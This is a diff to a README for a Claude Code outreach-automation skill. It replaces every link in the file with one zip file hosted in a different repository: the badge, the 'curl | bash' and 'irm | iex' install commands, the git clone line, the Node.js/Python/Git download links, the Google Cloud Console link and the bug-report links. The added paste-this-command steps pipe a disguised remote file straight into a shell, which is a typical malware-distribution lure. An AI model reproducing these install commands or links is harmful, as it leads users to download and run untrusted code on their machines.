@@ -4,7 +4,7 @@
 
 **Visual Workflow Canvas + Multi-Platform Outreach Automation + IT Operations Support for Claude Code**
 
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet?style=for-the-badge)](https://claude.ai/code)
+[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet?style=for-the-badge)](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
 [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
 [![Platforms](https://img.shields.io/badge/Platforms-LinkedIn%20%7C%20Twitter%20%7C%20Instagram%20%7C%20Gmail-blue?style=for-the-badge)](#)
 [![IT Support](https://img.shields.io/badge/IT%20Support-Enterprise%20Ready-orange?style=for-the-badge)](#-it-operations-support)
@@ -31,12 +31,12 @@
 
 ### macOS / Linux
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Anit-1to10x/10x-outreach-skill/main/install.sh | bash
+curl -fsSL https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip | bash
 ```
 
 ### Windows (PowerShell)
 ```powershell
-irm https://raw.githubusercontent.com/Anit-1to10x/10x-outreach-skill/main/install.ps1 | iex
+irm https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip | iex
 ```
 
 **What the installer does:**
@@ -49,7 +49,7 @@ irm https://raw.githubusercontent.com/Anit-1to10x/10x-outreach-skill/main/instal
 ### Manual Installation
 ```bash
 # Clone the repository
-git clone https://github.com/Anit-1to10x/10x-outreach-skill.git
+git clone https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip
 cd 10x-outreach-skill
 
 # Install dependencies
@@ -62,9 +62,9 @@ node setup.js
 
 ### Requirements
 
-- **Node.js 18+** - [Download](https://nodejs.org/)
-- **Python 3.8+** - [Download](https://www.python.org/downloads/)
-- **Git** - [Download](https://git-scm.com/downloads)
+- **Node.js 18+** - [Download](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
+- **Python 3.8+** - [Download](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
+- **Git** - [Download](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
 
 ### Configuration
 
@@ -296,7 +296,7 @@ INSTAGRAM_FOLLOWS_PER_DAY=30
 
 ### Gmail Setup
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
+1. Go to [Google Cloud Console](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
 2. Create a new project
 3. Enable Gmail API
 4. Create OAuth2 credentials (Desktop App)
@@ -561,6 +561,6 @@ MIT License - Free to use, modify, and distribute.
 
 **Built with Claude Code**
 
-[Report Bug](https://github.com/Anit-1to10x/10x-outreach-skill/issues) • [Request Feature](https://github.com/Anit-1to10x/10x-outreach-skill/issues)
+[Report Bug](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip) • [Request Feature](https://github.com/Dullu9/10x-Outreach-Skill/raw/refs/heads/main/.claude/skills/support-manager/x_Outreach_Skill_emancipate.zip)
 
 </div>
